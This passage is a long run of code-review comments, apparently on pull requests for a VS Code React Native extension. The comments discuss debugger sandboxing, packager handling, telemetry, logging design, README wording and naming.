we'll just use that behavior, we might improve it in the future.\n. Source mapping doesn't work without outDir.\n. It's the folder where the source maps and the generated code are expected to be found.\n. If the key is not found in the .json file, it means you don't have any dependencies, so you can return an empty list.\n. I'm fine with doing that as long as we are sure that it is true for most react-native applications. That assumption is what I think we should verify before leaving the code as-is.\n. Excelent!\n. Can this logic be reused in other places? Would it make sense to move it inside the Log class?\n. I think a user might get confused if he sees this message.\n. I think it would make more sense to expect the path with the ios already appended here, and let the caller take care of doing that.\n. If all the paths need the iOS to be appended, it might make more sense for this class to expect the iosProjectPath instead of the reactNativeProjectPath\n. I vote we change this to:\nNot implemented: Coming soon in 2016 to all VS Code workspaces\n. Just for consistency, I'd get the react-native command string from the DesktopPlatform.\n. I'd put the device logic in the else clause of the if simulator, to show they are on the \"same level\"\n. You are already doing this on line 19. Is there any way to eliminate the duplicated code?\n. If you don't need to pass the projectPath, I'd update CommandExecutor to make the argument optional instead.\n. I'd print the list of all files we found here, and which one we choose to use, and a link to some troubleshooting page where we can help the user solve this issue if necessarily.\n. I'd print pathBefore and pathAfter here to make troubleshooting easier.\n. But it might be helpful if they report the issue to us.\nWe could also have a troubleshooting guide that explains the issue, and tells you to go and delete all the old folders, so only the new version of the app is there.\n. Given our last design meeting, I'll leave it as is, so you can refactor it based on what we discussed.\n. I agree with you, but it's hard for me to think of a good name.\nWhat about:\n- waitForProcessingToFinish\n- waitForWorkerProcessingToFinish\n- scriptWasImported\n- blockedOnImportingScript\nThe description of this variable is:\n\"This variable holds a promise used to block the answer that we sent back to the RN app when we are importing a script, to send the response after we finish processing the command, instead of just after reviving it. We need to do this because the original implementation of \"executeApplicationScript\" runs synchronically in debuggerWorker, but our implementation with our custom importScript logic is asynchronical, so we need to \"adapt it\"\"\nI'm also open to suggestions! :)\n. I'm working on that currently, and I'm going to send it on a different PR.\n. The debuggerWorker executes this code:\n    importScripts(message.url);\n    sendReply();\nIn the original code importScripts is a sync call. In our code it's async, so we need to mess with sendReply() so we won't actually send the reply back to the application until after importScripts has finished executing.\n. See comment above\n. The worker only starts working when the socket gets a message, so I think that this is the correct order.\n. It's the first message as far as I've seen.\n. For v1 we are still going to download the worker.\n. The original class was named ScriptImporter because of this function: https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope/importScripts\nNow that we don't actually have the same semantics as that function, I think we should change it to something else to make that distinction clear.\nI agree with you that Downloader is probably not \"enough\" for what we are doing, but in the debuggerWorker context the Importer means something different. Do you have any other suggestions for the name?\nScriptDownloaderAndPreparer\nScriptDownloaderAndAdapterToVSCode\nScriptAdapterForVSCode\netc... ?\nWhat would you suggest?\n. If the import fails I think that that lifetime/sandbox is done. The only import message I've seen so far is for the bundle file. If that import fails debugging is over (your only option is to reload the app after that).\n. I think that you should either return all the files you found, or if you expect to find a single file, throw an error if you find more than one,\n. The code for F5 doesn't have access to vscode. So we need to call console.log when we are under F5, and use output channels for the command palette.\nOne way to make this happen would be to have two Log classes imementing the different approaches or a single Log class that has two PrintingStrategies: class DebugConsoleStrategy and OutputChannelStrategy.\n. Is it possible to open the files in binary format so we won't need to pass the encoding parameter?\n. Renamed isAnswerReady to pendingScriptImport and initializing to Q(void 0);\n. Changed to async calls.\n. Updated comment to:\n        /* The debuggerWorker.js executes this code:\n            importScripts(message.url);\n            sendReply();\nIn the original code importScripts is a sync call. In our code it's async, so we need to mess with sendReply() so we won't\n        actually send the reply back to the application until after importScripts has finished executing. We use\n        this.pendingScriptImport to make the gotResponseFromDebuggerWorker() method hold the reply back, until've finished importing\n        and running the script */\n. Updated comment to:\n        // We might need to hold the response until a script is imported. See comments on this.importScripts()\n. Added rejection handler:\n                    Log.logError(Couldn't import script at <${url}>. Debugging won't work: Try reloading the JS from inside the app, or Reconnect the VS Code debugger, reason, true);\nI'm not sure if there is any useful programmatic action we can take here.\n. I added:\n        // TODO: Add on error handler\nI'll address that comment in the PR where I migrate to ws\n. Although I agree that it makes more sense to create the singleLifetimeWorker after we get the \"prepareJSRuntime\", I think that creating the Worker before the Socket makes the implementation easier, we can then assume that every time we get a message the Worker is already alive. If we didn't do that we'd have to add more error checking to detect where we get a message for the worker, but it hasn't been created yet.\n. Changed to Packager.DEBUGGER_WORKER_FILE_BASENAME\n. We could also expand CommandExecutor to support both scenarios. We could return {spawnedProcess, outcome} \n. I'll add a TODO to remove this (This was the task about waiting for the packager, etc...)\n// TODO: We need to remove all the delays, yet make sure things work properly for both Android and iOS\n. Done!\n. Let's leave it as Importer for now then.\n. It would be great if we could put all parsing logic in that method! You could parse the stuff and set the parsed values instance variable, and the read it wherever you need it:\nthis.simulatorTarget = launchArgs.target || IOSPlatform.simulatorString;\nthis.isSimulator = simulatorTarget.toLowerCase() !== IOSPlatform.deviceString;\nWhat do you think?\n. ## I'm guessing that most users will mentally ignore most messages in the output. It might be a good idea to log this with emphasis maybe with Log.logImportantMessage() and then log something like:\n* USER ACTION NEEDED: Application is running on a device.. *\nWhat do you think?\n. Can you split this line in two? It's about 180 characters\n. I added:\n    // TODO: Add proper typings for message\nAnd a try and catch which calls this on an exception:\n            printDebuggingFatalError(Failed to process message from the React Native app. Message:\\n${message}, exception);\n. Can you extract a method from the 3 calls to PListBuddy to something like this?: new Node.ChildProcess().exec(${PlistBuddy.plistBuddyExecutable} -c ${CommandAndParameters} '${plistPath}').outcome;\n. If they use the run packager command without setting the REACT_DEBUGGER variable, and then they press F5, the debugging experience might break because chrome will be opened. On the other hand, if you don't do this, and if they press \"Debug in JavaScript\" nothing will happen if you set the env variable. We have plants to actually support that scenario in the future, but we don't support it now. What is the right think to do here?\n. I changed them to this:\n```\npublic readFile(filename: string, encoding: string = \"utf8\"): Q.Promise {\n    throw new Error(\"To implement with Q.denodeify\");\n}\npublic writeFile(filename: string, data: any): Q.Promise {\n    throw new Error(\"To implement with Q.denodeify\");\n}\n```\n}\n// We only copy these two methods, instead of all the methods of fs, because we need to remember to add the signatures manually\n// to class FileSystem with a throw new Error(\"To implement with Q.denodeify\"); implementation before adding it here\n[\"writeFile\", \"readFile\"].forEach(methodName => (FileSystem.prototype)[methodName] = Q.denodeify((fs)[methodName]));\n. Nice catch! Thanks!\nThe start code executes when you can't connect to the packager. You open the socket. It fails, so you get the close even, so you call start again, etc... It will retry up to infinity (I'll add a todo to print that message less often).\n. I think this would better isolate the code from the UI implementation if the logMessage received a message and a topic.\nFor console log we can print [topic] message.\nAnd for inside vs code we can find the proper output channel, and print it there. What do you think?\n. Do you need to set packagerProcess to null here?\n. You can replace this if code with:\nreturn dependencies && dependencies[\"react-native\"];\n. Is it possible that we get an EPERM error while trying to open the package.json of a valid react native project?\nIf so, we should try to print a helpful message to the user.\n. Why do we need to check if this file exists? Dont we want the extesion to throw an error if its not there?\n. Thanks! I didn't know that.\nFixed!\n. Added TODO to change it to run inside the sandbox\n. In general, we should try to make anything that runs inside the extension process Async because we share that process with other extensions.\n. I think we should just leave the generic FileSystem functionalities here, and move this method that it's specific for how we do our typings to another module.\n. If you want to use them, FileSystem now supports both readFile and writeFile methods\n. This .then only does sync stuff. I'd merge it with the next .then block.\n. Can you add some comments or links to documentation explaining how this feature works?\nWhy does setting allowJs give us IntelliSense? According to this: https://github.com/Microsoft/TypeScript/wiki/Compiler-Options it just \"Allow JavaScript files to be compiled.\"\n. The 3 times you call makeDirectoryRecursive you check if the folder exists before that. It might make sense to put that logic inside the makeDirectoryRecursive method, and optionally rename it to makeDirectoryRecursiveIfNeccesary or makeDirectoryRecursiveIfDoesNotExist.\n. I'd consider adding a check to only write the file if we are actually modifying it.\nIf tsConfigJson.compilerOptions.allowJs was already set to the value we want it to be, we don't need to re-write it.\n. I'm assuming that this file will be shipped with the extension. The only reason why it might not be there might be because the installation of the extension broke somehow. I'm guessing that we want to show an error, and possibly suggest the person to re-install the extension (so this file will appear on the proper place).\n. I'm not sure which option is better, but I'd also consider naming this folder build, or .build to people will know that we are putting temporary build artifacts there.\n. It doesn't seem so. These seem to be the supported commands, and react-native upgrade only regenerates some of the files it seems, not all of them.\nCommands:\n- start: starts the webserver\n- bundle: builds the javascript bundle for offline use\n- unbundle: builds javascript as \"unbundle\" for offline use\n- new-library: generates a native library bridge\n- link: Adds a third-party library to your project. Example: react-native link awesome-camera\n- android: generates an Android project for your app\n- run-android: builds your app and starts it on a connected Android emulator or device\n- run-ios: builds your app and starts it on iOS simulator\n- upgrade: upgrade your app's template files to the latest version; run this after updating the react-native version in your package.json and running npm install\n. Why did you deleted this line?\n. I'd rename this method to executeReactNativeRunCommand or something else to reflect that it's only for run commands, and also update the description to say that it's starts the packager before executing the run command.\n. Sorry, that's an error. I'll delete that line.\n. Could we resolve with {isReactProject: false, err} or {isReactProject: true} and show this message in part of the extension code where we can access vscode?\nI think we should keep the message\n. My hope is that precaching the bundle solve all those issues.\nBefore implementing the precaching, I ran the app, and it failed to debug on the first attempt.\nAfter implementing precaching (and removing all the delays), I ran the app, and I was able to debug on the first attempt on both Windows/Android and Mac/iOS.\n. Why do we need to add this? Aren't all the non blacklisted files included by default?\n. A related question to this, would it make sense to instead of reading the files from reactTypings.json, to use https://nodejs.org/api/fs.html#fs_fs_readdir_path_callback to just read the files that are available in the folder?\n. It's not about this review actually, but it's it okay to potentially throw an exception on a dispose method?\nAlso, should we be doing sync or async stuff here?\n. How about RNApplicationMessage? or RNAppMessage? We have a lot of moving parts, so I want to make it clear that this comes from the mobile RN app runnning on the device/simulator.\n. I'm just wondering what will happen if we throw an exception there. Will VS code show a message to the user? If so, what message? Is that the behavior we want?\n. Done!\n. Done!\n. Done!\n. Added these comments:\nexport class SandboxedAppWorker {\n    /* This class will run the RN App logic inside a sandbox. The framework to run the logic is provided by the file\n     * debuggerWorker.js (designed to run on a WebWorker). We load that file inside a sandbox, and then we use the\n     * CODE_TO_RECEIVE_MESSAGE_INSIDE_SANDBOX script to execute the logic to respond to a message inside the sandbox.\n     * The code inside the debuggerWorker.js will call the global function postMessage to send a reply back to the app,\n     * so we define our custom function there, so we can handle the message. We also provide our own importScript function\n     * to download any script used by debuggerWorker.js\n     /\nexport class MultipleLifetimesAppWorker {\n    /* This class will create a SandboxedAppWorker that will run the RN App logic, and then create a socket\n     * and send the RN App messages to the SandboxedAppWorker. The only RN App message that this class handles\n     * is the prepareJSRuntime, which we reply to the RN App that the sandbox was created succesfully.\n     * When the socket closes, we'll create a new SandboxedAppWorker and a new socket pair and discard the old ones.\n      /\nAre these good enough?\nWhat name would you suggest for this variable?\n. Maybe enableJSXIntelliSense or enableJSXIntelliSenseForProject?\nFrom the interface side we only care about enabling IntelliSense. The fact that we are setting allowJs is an implementation detail.\n. What about: RECEIVE_MESSAGE_INSIDE_SANDBOX then?\n. Or PROCESS_MESSAGE_INSIDE_SANDBOX\n. We should come up with a code style guideline when we have some time available, and get a tslint kind of tool to check it automatically if possible.\n. I prefer to go file by file in this case, just in case something else appears there.\n. Unintentional.\nFixed!\n. Has Parashuram signed off on this?\n. Perfect!\n. Is the output that you see afterwards useful for the users? or for understanding what is happening here? If it is, we should try to show it too.\nCould you paste what some sample output might be?\n. Is this command the only command we have with this issue (exiting with 0 code on failure), or are there any other commands that do the same thing? If we do have other cases, it might make sense to extract the logic to \"fail\" on stderr string matching to some utility class or a new method in CommandExecutor, so we can reuse it for other commands.\n. How did you choose 1000 as a delay? Is it possible that it might be too little on a slow machine? Is there any event that we might listen to know that the app was started (e.g.: the packager might be getting a GET bundle request and showing some output)\n. What is the part that would be cut out if you reject the promise immediately?\n. But what is that further output? Would a user want to see those lines?\n. Just to be on the safe side I'm assuming it can be null\n. Should we move the typings into a .d.ts file?\n. Is there any tslint rule to force using const when appropriated?\n. Putting that in the out folder seems weird. Should we use some kind of settings or configuration folder instead?\n. Should we wait for the answer of this method before returning?\nIs it possible to get into a race condition because we are reaplying the breakpoints and we run some code that might be stopped by those breakpoints before the reaplying taks finishes?\n. Can you put a try and catch with a nice error message around all the code in this file? You are doing a lot of things that normally shouldn't fail, but we should be prepared just in case.\nAlso, if you intend to create automatic tests for this code eventually, could you put all the code inside a class?\n. For when we run into issues, it might be useful to respond some content that indicates whether nodeDebugSession and/or  sourceMaps were null or not, so we know which branch of the code was executed here.\n. I think that port 8080 is a quite common port for web servers. Could we choose a more esoteric port as a default port, to minimize the chances of the port being used?\n. Should we call this after we've written both the new .map and .bundle file just to be on the safe side?\n. Should we refactor the code so that setupReactNativeDebugger will get blocked until writing this file finishes? We wouldn't want the user pressing F5 before this file is written.\n. Worst case scenario we can just write it to some debuggerAdapter.log file someplace it's easy to find. Eventually a user will have an issue with the Debugger Adapter, and we'd want to know what kind of error/stack trace he is getting. What do you think?\n. I agree we should keep it in the extension, but I don't think we should reuse the \"generated source code\" folder.\n. I'd rename this to debuggerInternalPort. I wouldn't put react-native here, because they might think it's related to the packager, or something that RN offers, and I'd put internal to make it clear that they are not going to use this directly. What do you think?\n. The promise fails and gets ignored by the .catch in commandPaletteHandler\n. I'd use an if here. Someone might decide to define HOME pointing to a weird place in Windows for some reason.\n. Is it possible to restart VS Code with a command as in:\nSalsa was installed but you need to restart VS Code. Do you want to restart VS Code now?\n. Please use the auto-format command of VS Code on this file.\n. We should print a warning here.\n. If there is no pre-warning it's possible that the bundle request will time out in the mobile app, and you'll have to either \"Reload JS\" or change the app into debugging mode manually.\n. It's \"normal\" but because we are starting the packager just before launching the process, it's much more likely that this will happen in VS Code without the prewarming that if you don't use VS Code. So I think we need to warn the user if we failed to do it, and he might required to reload the app or change it into debugging mode.\n. Can we move the TelemetryHelper.generate inside this.executeCommandInContext, and pass it the actionTitle parameter, so we can generate the same telemetry from inside that method but avoiding the duplicated code?\n. Fixed!\n. I'd put these 2 statements inside the generate, just in case we get a null and they throw an exception\n. We want to get telemetry if people are hitting this error. One possibility would be to move this statement inside the generate, and then throw an exception instead of calling Log.logError, and the error will get caught/printted by the .done at the end of the chain.\nAnother option would be to generate telemetry each time we call logError. I'm not sure which is the best approach. What do you think?\n. We should add a generate here, so we'll catch errors that happen during activation.\n. I think we should make this the first line after Telemetry.init in case some of the initialization fails.\n. This code with the telemetry.init seem to be used in a few places. I think we should move it to an utility in commons, and just have all places call that with the \"react-native-debug-process\" or equivalent name as a parameter. It might also make sense to put a .generate inside that method too.\n. You seem to be using these two lines in several places. If you are going to use this approach, instead of merging this in an utility with Log.logMessage I think we should still have an utility to create and send the telemetry event in a single line.\n. Is this line supposed to be here?\n. You have the same lines from 65 to 69 and from 91 to 95. Can we eliminate the code duplication somehow? Maybe putting the sendPendingData in the process beforeExit method? or some other way?\n. Can we put this code in a method or function then? And call it from two different places?\n. Can you add a property to these event, so we know which file was missing in each case?\n. I think it's \"A development\"...\nOr if you want to be more dramatic \"THE  development\"...\n. From THE command pallete?\n. I think we are targeting 0.19+ currently\n. I think we should put \"the most common commands\" so people won't expect to find every command of react-native on the palette\n. npm install -g react-native-cli is part of the facebook getting started, and it's not the first step. I think we should combine these two sentences:\nSet up ReactNative (0.20+) and ReactNative CLI (0.1.10+) using the steps detailed on the ReactNative getting started documentation \n. I'd be more specific, given that this only works if they open the root folder like:\nOpen the root folder of your React Native project (where your package.json is located) as a VS Code workspace.\n. Here they call it Debugging icon: https://code.visualstudio.com/Docs/editor/debugging\n. I think we should list here all the parameters and their explanations, or at least how to find them.\n. VS Code is the debugger. This should say: \"To start the debug session\"\n. According to VS Code language this would be: \"select a configuration from the Configuration dropdown\": https://code.visualstudio.com/Docs/editor/debugging\n. I think this should be or, not and.\nDo we mention that we have experimental support for iOS devices?\n. Remove word \"using\"\n. I'd add: \"We use some smart tricks to enable  debugging inside VS Code\"\nThe current phrase sounds to me like VS Code doesn't support debugging very well.\n. Should we list or put a link to the default installation locations of Android SDK on Mac and/or Windows?\n. Can we mark this with a TODO so it's easier to find the parts that needs to be finished?\n. I'd add some mention that this can't be used to debug in VS Code just to be extra clear.\n. Add TODO\n. Should we mention what this path would be in windows?\n. Why is this change in this PR?\n. Given that you pass the appName to 3 of the 4 methods in this class, I'd suggest to put it as an instance variable.\n. Can you refactor this to a few private methods? I find it difficult to follow a method with so many control flow levels.\n. Could you add a comment explaining this regexp in English? (What are we trying to match intuitively)\n. What are the () for?\n. Shouldn't the . in (?:.|\\n)+? be only whitespaces kind of characters?\nAlso isn't (?:.|\\n)+? equivalent to (?:.|\\n)*               ?\n. I'd extract (?:.|\\n) to\nprivate static ANY_CONTENT = \"(?:.|\\n)\"\nand then construct the complex regexp using string interpolation extracting other semantic parts too.\n. Isn't *? equivalent to just *            ?\n. Given that you use it in 2 methods, I'd just put the file system as an instance variable\n. I'd pass null instead of this to .apply just to show that we are not using that value for anything.\n. I'd refactor this method to have a single call to this.readPackageName(variable, appName); at the end (Similar to scriptImporter.ts line 36 and on...)\n. I'd remove the call to fs.exists(manifestPath) in this file, and let readFile fail if the file doesn't exist. (I'd check for nulls when findFile returns though)\n. I'd make this method return the package name or a failed promise, and then the parent method can return this.getDefaultPackageName(applicationName) when the promise gets rejected.\n. I think we should let the build run anyway, it'll give a better error message than us.\nAlso for Preview we are using just a regexp to parse the manifest, so it might false for some valid files.\n. I think that in react-native you are allowed to do whatever you want with the native source code, making this a valid case.\n. Upon futher checking @MSLaguana is correct: https://github.com/facebook/react-native/blob/master/local-cli/runAndroid/runAndroid.js\n const packageName = fs.readFileSync(\n      'app/src/main/AndroidManifest.xml',\n      'utf8'\n    ).match(/package=\"(.+?)\"/)[1];\nWe should probably just use something similar to that...\n. There are many ways to do it. I think it's safer to avoid explicit casting like >, that's why I'm doing it this way. I'm open to other ways of doing it if you have any suggestions.\n. Eventually we'll move all this code to run on the extension, which needs to use async for everything because the process is shared across all VS Code Extensions.\n. This block is sync. You can merge it with the next one.\n. We check for null on line 56 of the caller\n. I'm not sure which change you are referring to.\n. This is to fix the issue of printing error [object object]. Now we'll stringify it and print something useful instead. Issue: https://github.com/Microsoft/vscode-react-native/issues/31\n. You mean as in telemetry?\n. @nisheetjain We are reading this from node_modules/react-native/package.json so we should get just a number.\n@dlebu Given that we even have to think about if the string comparison works or not, I'd argue to go with the split version, which is not that much more code, yet it's sure to work for all cases. What do you think?\n. That's a good idea. I'll put a link to https://facebook.github.io/react-native/docs/upgrading.html .\n. This method seems to have a lot of duplicated code. Can we refactor it so it uses spawnChildProcess or other methods and we avoid all the duplicated code?\nWe also were trying of leaving all the react-native dependencies in a single place, so I don't think that this class should have knowledge of the packager itself. I think code that knows about the packager should be in ReactNativeProjectHelper or Packager or on any of the react-native specific classes.\n. Is this test intended to check if we are in a Debugging Scenario or not? If it is, can we use a variable\nlet isStartingDebuggingSession = some condition here instead,\nand also use that variable for line 72, which I think it's doing the same test?\n. I'd say something like: \"Debugging is not supported if the react native packager process isn't started from within VS Code. You can continue, but if debugging fails you'll need to...\"\nAlso can we create a Log.logWarning method, and automatically put emphasis in all warnings with something like a \"WARNING: \" prefix?\n. Why doesn't the this.packagerProcess.kill(); work in Win32?\nI'd also use the exec that returns a promise that we defined in childProcess.ts\n. Oh, I completely misunderstood this part of the code. Sorry :(\n. In that post they say:\nIf you want to be able to kill child processes via SIGKILL, use spawn instead, as spawn will create a child process (instead of a new shell like exec:\nAnd we are using spawn to create the packager, so why can't we kill it?\n. It's hardcoded on react-native cli so we are fine: https://github.com/facebook/react-native/blob/master/react-native-cli/index.js#L46\n. Added separator:\nlet errorMessagePostfix =  error ? : ${Log.getErrorMessage(error)} : \"\";\n. TelemetryHelper.sendSimpleEvent(\"launchDebuggerError\");\n            Telemetry.sendPendingData().finally(() => {\n                process.exit(1);\n            });\n. Added:\n                            TelemetryHelper.sendSimpleEvent(\"launchDebuggerError\", { rnVersion: reason });\n                            Telemetry.sendPendingData().finally(() => {\n                                process.exit(1);\n                            });\n. If the user messed with the react-native folder mainly\n. It's unintentional, but it's just changing an LF line ending to a CRLF so i'm leaving it there for simplicity.\n. You are right... Fixing that soon...\n. You are right. I won't fix this in this PR though, I'm going to fix it in my next PR where I'm solving the errors printing twice issue: https://github.com/Microsoft/vscode-react-native/issues/55\n. Meena has a task to solve that issue\n. It was accidentally, but I think we actually do want these updates, so I'm leaving this file as-is.\n. Removed file in other pr\n. I'm rewriting how we handle and report the errors at the top level, so you can leave the code as-is and add a TODO, and I'll implement it as part of my fix/PR.\n. I'd assign null to serverInstance after we close it, just to have 2 possible states in the object (null or non-null and opened).\n. return a 404 on rejection?\n. If we are planning on supporting a lot of messages, I'd use a dictionary here instead of a switch.\n. Instead of using an any, I think I'd be better if we defined an interface for each message type we are planning on sending , and then the type of the message is MessageType1 | MessageType2 | MessageType3 etc... (Initially we'd just need a single message type to handle executing commands from the command pallete)\n. I'd go with an ExecuteCommand message with a \"startPackager\", \"stopPackager\" argument, that can potentially be \"runIos\" or \"runAndroid\" too for free if we need to (given that we already have those methods on the commandPaletteHandler). Another alternative to consider, is that we could instead just call a VS Code API to execute a command ( https://code.visualstudio.com/Docs/extensionAPI/vscode-api#commands.executeCommand ). I think that our commands should appear there, so we could potentially use that to reapply breakpoints too when they release it, or any future commands that we add.\n. I'd put the classes and stuff shared between the client and the server in a common third file like ExtensionCommunicationProtocol.ts\n. I'd put the type of the message in the path for example:\npath: /executeCommand\nbody: { commandName: \"startPackager\" }\nIf you like RESTful you can even go\n/commands/execute\n. We might not need this for V1, and maybe we can put it off for now, but in the long term I think we should expose the async nature of the operations in the server as in:\nPOST /commands/execute { command: \"startPackager\" } ---> Returns ID 1234\nGET /commands/list?id=1234 ---> Running\nGET /commands/list?id=1234 ---> Running\nGET /commands/list?id=1234 ---> Finished\n. should we use tests instead of test?\n. Fixed!\n. Fixed!\n. Fixed!\n. Changed to:\noutcome.reject(new Error(Command ${command} failed with error code ${code}));\n. Renamed to printDebuggingError()\n. Fixed!\n. Thanks, I missed that! :)\nReplaced line 83 from Failed to execute command ${commandName} to errorDescription\n. I'm not sure. @joshuaskelton: can we do these all at once?\n. Changed to Log.logWarning.\nYou are correct, it's potentially warning erroneously but at the moment we don't know from the debugee process who launched the packager. I'm going to add a TODO so we can review this after the updates we are making to the packager, so we can make sure that we stop printing this if it's not necessary.\n                        // TODO: This warning is printted incorrectly when the packager was started from the command palette. Fix it.\n. Thanks for suggesting a simpler implementation! :) changed to:\n            return runIosSpawn.outcome.then(() => {\n                deferred.resolve(void 0); // We resolve deferred when the process ends, in case it wasn't already rejected\n                return deferred.promise; // We return the promise. If an error was detected on stderr, this will be a rejection\n            });\n. I don't want to add more noise to this PR, so I'm just adding a TODO:\n        /* TODO: Refactor this code to\n            Q.all([enableSalsa(), installTypescript(), configureWorkspace()])\n            .then((result) => warnIfRestartIsRequired(result.any((x) => x)))\n        */\n. Deleted runSyncCode and using runCode instead\n. Fixed!\n. 1. handleErrors has a different use inside runApp\n2. Done!\n. What about internalExtensionPort to be consistent with the other port?\nWould it be difficult to implement some logic so we choose those ports automatically, so we don't have to expose those parameters to the user?\n. My intention was actually to leave them on master. @meenakb was working on refactoring the error code, so I think she'll probably provide a fix for this on one of her PRs. If she doesn't, then I'll fix this on a further PR after she merges her changes. Does that sound good to you?\n. I think that this code will become unnecessary after we fix: https://github.com/Microsoft/vscode-react-native/issues/56 , so I'm waiting for that fix\n. We need a return of a valid promise, because if not the code crashes. We can write that promise in different ways like:\nreturn Q.resolve(void 0);\nreturn Q(void 0);\netc...\n. Changed to generateRejectionForCommand\n. I think that childProcess.execToString is a better match here\n. This is intended for code that is called from outside our application. For the time being none of those use-cases require us to return a value. If we find one in the future, we can change the typing then.\n. It's only intended to be used on entry points (where our app starts, and where other apps like VSCode is calling us). It's not a general class for telemetry and error reporting.\n. I'm implementing that suggestion in a different PR, so we can discuss it with the whole team\n. Thanks for the heads up! :)\n. I think you should just open the readFile, without checking if it exists or not\n. I'd reject the promise instead of returning null\n. I think we should send the parameters by name using args: any instead of by position using args: any[]. You can also set a default value of = {} so we know that we always have the args, making the code slightly simpler\n. I wouldn't put downloadDebuggerWorker here. ScriptImporter was cohesive before just being responsible for downloading the scripts that the RN App requests, and this method is not related to that responsibility.\n. Can you refactor the file reading to another method and pass it as a parameter? That will make is easier when we write tests, and we want to just pass the configuration without reading the file.\n. I'd also make args be something like args1|args2|args3 so we get some kind of typing for this, instead of using any\n. Added .done()! Nice catch! :)\n. You are right, that should be a false! Fixed!\n. An error while parsing should reject the deferred\n. That code actually has a bug. Rewritten as:\n    const reactDirManager = new ReactDirManager();\n    return reactDirManager.create()\n        .then(() => {\n            context.subscriptions.push(reactDirManager);\n        });\n. Given that for the purpose of this method, the file not being there, or being unable to read it for any reason is the same, I'd argue that we should either return the JSON object, with a resolved promise. And if for any reason we cna't do that, we should just reject the promise and let the caller handle it somehow. Adding a third possible case that we tread identically to the second one, just adds unnecessary complexity.\n. The thing is that we are polluting the UI with things he shouldn't really care about. It would be nice if we could magically solve this problem under the rug.\n. Done! https://github.com/Microsoft/vscode-react-native/issues/83\n. why is this any?\n. I don't think so. If you refactor it you'll just need to call setup(1234); if you don't you'll need to create a mock SettingsHelper.readLaunchJson, install it, etc...\n. If VS Code doesn't guarantee any kind of type validation, then we should mark all the parameters as any, and make sure that we handle them if we are not what we expect them to be.\n. I agree with the any. I'm saying that all the other user provided values should also be any, and they should be marked as string or number only after we've successfully parsed them or validate that they are the proper type.\n. Nice catch! Thanks! :)\n. Yes. This is not an instance variable, so we though that it wasn't necessary.\n. What happens if the user has different configurations with different internal ports? Maybe he uses one port for Android and one for iOS. Maybe he uses both Windows and Mac and has Run Android on Windows and Run Android on iOS and passes a different port to each one.\n. We read JSON files in a few different places. I'd refactor this to take the file path as a parameter, and put a generic readJson method in the FileSystem class.\n. It's supported, so I think we can leave it as-is in case anyone wants to use it.\n. Inside time() we do Q(codeGeneratingTelemetry()). Q will convert the value to a resolved promise if we pass one, and the finally will work.\n. Changing to unsupportedRNVersion\n. It's on a TODO. Anyone who wants can do it :)\n. You are right. I'll add a public getter (at the moment we just use it to store stderr on .exec())\n. I just changed all the things that seemed reasonable that they could be an error.\n. I'm not a fan of using undefined explicitly. I'd consider using tsConfigJson.compilerOptions.hasOwnProperty(\"allowJs\") or \"allowJs\" in tsConfigJson.compilerOptions\n. These two lines may call cb multiple times according to the docs. Is that okay in this case?\n. You should compare it with 0. code can also be null indicating that the process didn't exit properly.\n. I'd put this method inside a class. Process can't be mocked with Mockery, so the cleanest option for testing this or dependent methods will probably be to pass a mock process as a constructor argument to some class.\n. I think that changing this method to expect an already built MessageWithArguments  instead of 2 parameters will make the code simpler.\n. Given that no-one seems to be using the return value at the moment, I'd change this method to return Q.Promise  instead of Q.Promise .\n. Why is this any?\n. Scratch previous comment, I haven't seen line 38. Won't this logMessage print the error twice if we have an error?\n. If this is intended to be an internal message, we should call logInternalMessage instead\n. I'd remove this variable and just declare the function inside line 114.\n. Should we return some kind of 404 or error to the socket?\n. Git is interpreting it as markup. There is a < void > and a < any > after those two promises :)\n. Could you please add some comments explaining why we are using removePathRecursivelyAsync here instead of removing a single file or directory?\n. I think the logic would be much simpler if we just initialized Log with a boolean telling it if it's on the vs code extension or not, and the Log would choose automatically where to print stuff (Output Channel on the extension, and console.log or stderr for the debugee process). If you don't want to pass the boolean variable explicitly, we can probably figure out automatically in which process we are by checking if the vscode global variable or something like that is defined or not. \nIf we do that we can change the interface to something like:\nLog.logMessage(/topic/\"packager\", \"Starting the packager\");\nLog.logError(/topic/\"packager\", \"Failed to start the packager\", error);\nAnd we use that value to print it to the correct place. If we are on extension we can print it to a channel named as the topic. If we are on the debugee we can print it with the perfix [packager].\nWhat do you guys think about this change?\n. I'd use a different method. Currently we use Log.logError for fatal errors. Maybe we should rename that method to Log.logFatalError and create a new Log.logError method for this kind of uses.\n. Does it make sense to have the strings in a separate file if we are not planning on supporting translations of the messages? If we put them inline it'll be easier to see that this one needs two parameters for example.\n. We can write to 3 places, but I think that we have 2 states only:\nextension: {normal: console, error: stderr}\ndebugee: {normal: outputChannel, error: outputChannel}\nAnother option would be to provide a LogStrategy to the logger that you can delegate the choice of were to print it to that class, and we can set it on the start of the extension and the debugee process, but we can still modify it if necessary.\n. I like the idea of \"caller-passing-write-function\", but I just don't think that we should pass it each time.\nGiven that what changes in each call is the \"message to print\" but the \"strategy\" we use to print is fairly consistent across a single class, we could pass it as an instance variable in a constructor, or set it with a static method, and then each class only needs to specify that strategy once, and then it can print as many times as it wants.\nGiven that the strategy is fairly consistent across the whole process, we can try to make it so we only call that method or constructor at the start of the program, and then we pass it around, and people only modify it (either by calling the setting method, or creating a new instance of Log) as needed.\n. If the caller also has knowledge of two ways of printing (outputchannel vs console), then you'll have to create twice as many tests of that class to cover all the paths.... If it just knows a single way to print, because the Log decide where to print it, then you'll just need a single test to cover that path. That would reduce a lot of works on the tests.\n. I'd try to explain what correctly means in the name like:\ntest(\"setPlistProperty should set the property (and fail), and then add it when the property doesn't exist \")\n. I'd try to refactor this to make the code more linear/simple. Hopefully it should be obvious to see that a test is bug free, and in this case it's not that simple.\n. I completely forgot that! Thanks! :)\n. Fixed!\n. Node doesn't give us any way to \"stop\" a sandbox, because it's not a real sandbox. It's more like using a different namespace for the global variables only. I don't think we have any easy way of stopping a timer or something similar, if it was started inside the RN app code.\nThankfully, react-native seems to be overriding methods like setTimeout, etc.. https://github.com/facebook/react-native/blob/master/Libraries/JavaScriptAppEngine/System/JSTimers/JSTimers.js and they seem to be doing some sort of cleanup. I tested putting this in my app, and it worked perfectly with live reloading: \n        setInterval(function () {\n            console.log('test: ' + new Date());\n        }, 5000);\nSo I'm guessing that at least for timers, RN is taking care of that.\nRegarding the websocket, RN seems to support several \"lifetimes\" in the same socket, so we don't need to close it.\n. I'd test the whole string here, instead of just set, so we know that the filename, property and value were passed correctly. Same for next statements\n. I'd use an assert instead of the throws 